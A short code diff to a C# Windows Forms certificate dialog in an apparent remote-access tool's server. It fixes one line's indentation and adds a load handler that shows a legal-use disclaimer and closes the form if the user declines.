@@ -19,7 +19,7 @@ namespace Pulsar.Server.Forms
         {
             InitializeComponent();
             DarkModeManager.ApplyDarkMode(this);
-			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
+            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
         }
 
         private void SetCertificate(X509Certificate2 certificate)
@@ -133,5 +133,24 @@ namespace Pulsar.Server.Forms
         {
             Environment.Exit(0);
         }
+
+        private void FrmCertificate_Load(object sender, EventArgs e)
+        {
+            string disclaimer = "WARNING: This software is intended for educational and research purposes ONLY.\n" +
+                                "Unauthorized use on computers you do not own or have explicit permission to access is illegal.\n\n" +
+                                "By using this software, you agree that you are solely responsible for your actions.\n\n" +
+                                "Do you agree to proceed?";
+
+            DialogResult result = MessageBox.Show(disclaimer, "Legal Disclaimer",
+                                                  MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
+
+            if (result == DialogResult.No)
+            {
+                // User did not agree – close the form
+                this.Close();
+            }
+            // If Yes, the form stays open and continues loading
+        }
+
     }
 }
